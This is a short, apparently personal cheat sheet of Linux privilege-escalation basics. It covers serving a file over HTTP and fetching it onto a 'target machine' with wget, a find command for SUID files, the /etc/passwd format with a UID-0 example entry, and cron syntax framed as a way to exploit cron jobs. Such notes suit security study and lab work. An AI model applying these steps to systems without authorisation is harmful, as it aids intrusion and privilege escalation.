# How to get a file on a remote machine

## Start a python webserver on your machine
	python3 -m http.server 8000
## Use wget on the target machine to grab the file
	wget <your local IP>:<open port>/<filename>

# Amount of avaliable shells on the system

/etc/shells

# Search the file system for SUID/GUID files

find / -perm -u=s -type f 2>/dev/null

# /etc/passwd format

test:x:0:0:root:/root:/bin/bash

1. Username: It is used when user logs in. It should be between 1 and 32 characters in length.
2. Password: An x character indicates that encrypted password is stored in /etc/shadow file. Please note that you need to use the passwd command to compute the hash of a password typed at the CLI or to store/update the hash of the password in /etc/shadow file, in this case, the password hash is stored as an "x".
3. User ID (UID): Each user must be assigned a user ID (UID). UID 0 (zero) is reserved for root and UIDs 1-99 are reserved for other predefined accounts. Further UID 100-999 are reserved by system for administrative and system accounts/groups.
4. Group ID (GID): The primary group ID (stored in /etc/group file)
5. User ID Info: The comment field. It allow you to add extra information about the users such as user’s full name, phone number etc. This field use by finger command.
6. Home directory: The absolute path to the directory the user will be in when they log in. If this directory does not exists then users directory becomes /
7. Command/shell: The absolute path of a command or shell (/bin/bash). Typically, this is a shell. Please note that it does not have to be a shell.

# Format of a Cronjob

Cronjobs exist in a certain format, being able to read that format is important if you want to exploit a cron job. 

# = ID

m = Minute

h = Hour

dom = Day of the month

mon = Month

dow = Day of the week

user = What user the command will run as

command = What command should be run

For Example,

#  m   h dom mon dow user  command

17 *   1  *   *   *  root  cd / && run-parts --report /etc/cron.hourly

